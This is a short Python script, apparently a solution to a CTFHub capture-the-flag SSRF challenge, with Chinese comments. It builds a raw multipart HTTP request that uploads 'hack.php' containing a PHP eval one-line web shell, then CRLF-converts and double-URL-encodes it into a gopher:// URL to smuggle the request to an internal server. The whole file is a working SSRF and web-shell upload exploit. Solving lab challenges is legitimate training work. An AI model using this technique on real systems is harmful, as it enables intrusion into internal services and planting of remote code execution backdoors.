import urllib.parse
payload =\
"""POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 326
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-bf3ee9677bb8d6a6.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAyaSdqFXLgJ8ONet
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-bf3ee9677bb8d6a6.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryAyaSdqFXLgJ8ONet
Content-Disposition: form-data; name="file"; filename="hack.php"
Content-Type: application/octet-stream

<?php @eval($_POST['shell']);?>
------WebKitFormBoundaryAyaSdqFXLgJ8ONet
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundaryAyaSdqFXLgJ8ONet--


"""
#注意后面一定要有回车，回车结尾表示http请求结束。Content-Length是key=e01fdff5c126356cb64cf2436f8c7704的长度
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码

